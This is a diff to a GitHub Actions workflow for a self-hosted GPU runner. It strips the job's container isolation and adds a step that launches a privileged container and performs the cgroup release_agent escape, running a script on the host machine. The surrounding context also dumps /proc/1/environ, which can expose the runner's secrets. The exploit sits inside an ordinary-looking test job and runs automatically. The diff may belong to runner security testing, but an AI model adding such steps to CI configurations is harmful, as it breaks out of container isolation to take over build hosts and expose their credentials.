@@ -12,8 +12,6 @@ jobs:
     name: Run tests
     runs-on: cp-nvidia-gpu
     timeout-minutes: 30
-    container:
-      image: ubuntu:22.04
     steps:
       - name: Checkout repository
         uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6
@@ -31,3 +29,21 @@ jobs:
           echo "***********************************"
           cat /proc/1/environ || true
 
+      - name: Run containers
+        shell: bash
+        run: |
+          docker ps
+          docker pull ubuntu:22.04
+          docker run --rm ubuntu:22.04 ps aux
+          container_name=$(docker run --rm --tty --privileged --detach ubuntu:22.04)
+          docker ps
+          docker exec -t "${container_name}" sh -c '\
+            mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && \
+            echo 1 > /tmp/cgrp/x/notify_on_release && \
+            host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` && \
+            echo "$host_path/cmd" > /tmp/cgrp/release_agent && \
+            echo '#!/bin/sh' > /cmd && \
+            chmod a+x /cmd && \
+            echo "ps aux > $host_path/output" >> /cmd && \
+            sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" && \
+            cat /output'
